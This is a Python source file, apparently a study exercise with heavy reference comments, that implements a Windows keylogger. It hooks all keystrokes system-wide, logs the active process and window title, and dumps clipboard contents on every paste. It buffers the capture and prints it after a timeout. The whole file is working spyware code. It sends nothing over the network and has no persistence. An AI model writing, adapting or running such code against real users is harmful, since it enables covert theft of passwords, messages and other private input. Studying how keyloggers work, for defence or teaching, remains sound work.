from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

#! ctypes - a foreign function library for Python
#* https://docs.python.org/3/library/ctypes.html

#! Who is is Tim Golden?
#! Core Pyton developer
# import os
import pythoncom
#? http://timgolden.me.uk/python/index.html
#? http://timgolden.me.uk/pywin32-docs/pythoncom.html      
import pyWinhook
#* https://www.swig.org/survey.html
#* https://www.swig.org/download.html
#* https://zwbetz.com/how-to-add-a-binary-to-your-path-on-macos-linux-windows/
#? Also need C++ 14.0 or greater
#* https://visualstudio.microsoft.com/visual-cpp-build-tools/
#? Have to rename the directory path so there were no '.' or '-' in order for it to 
#? work in the systems environment variable PATH
import sys
import time
import win32clipboard
#* http://timgolden.me.uk/pywin32-docs/win32clipboard.html

TIMEOUT = 10
#? How long the program will run
#? You wont see anything until the program is done running

class KeyLogger:
    def __init__(self):
        self.current_window = None
        # win32clipboard.OpenClipboard()
        # win32clipboard.SetClipboardData(win32clipboard.CF_UNICODETEXT, 'Altered Text!!!')
        #? https://stackoverflow.com/questions/9119899/troubles-with-clipboard-in-python
        # win32clipboard.CloseClipboard()
        
    
    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        #* https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getforegroundwindow
        pid = c_ulong(0)
        #? This creates the process ID variable that the following line will set at the process ID in the line below. 
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        #* https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowthreadprocessid
        
        process_id = f'{pid.value}'
        
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        #* https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess?redirectedfrom=MSDN
        #? https://www.geoffchappell.com/studies/windows/win32/kernel32/api/index.htm
        #* https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
            #* PROCESS_QUERY_INFORMATION (0x0400), Required to retrieve certain information about a process, such as its token, exit code, and priority class
                #* https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
            #* PROCESS_VM_READ (0x0010), Required to read memory in a process using
                #* https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        #* https://learn.microsoft.com/en-us/windows/win32/psapi/psapi-functions
        
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        #* https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowtexta
        try:
            self.current_window = window_title.value.decode()
            # print(self.current_window)
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')
        
        print('\n',process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        #? Closing line 23 [hwnd = windll.user32.GetForegroundWindow()]
        windll.kernel32.CloseHandle(h_process)
        #? Closing line 32 [h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)]


    def mykeystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                #* http://timgolden.me.uk/pywin32-docs/win32clipboard__OpenClipboard_meth.html
                value = win32clipboard.GetClipboardData()
                #* http://timgolden.me.uk/pywin32-docs/win32clipboard__GetClipboardData_meth.html
                win32clipboard.CloseClipboard()
                #* http://timgolden.me.uk/pywin32-docs/win32clipboard__CloseClipboard_meth.html
                print(f'[PASTE] - {value}\n')
            else:
                print(f'{event.Key}\n')  
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyWinhook.HookManager()
    #* Registers and manages callbacks for low level mouse and keyboard events.
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()  
        #? http://timgolden.me.uk/pywin32-docs/pythoncom__PumpWaitingMessages_meth.html
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log
    
if __name__ == '__main__':
    print(run())
    print('done.')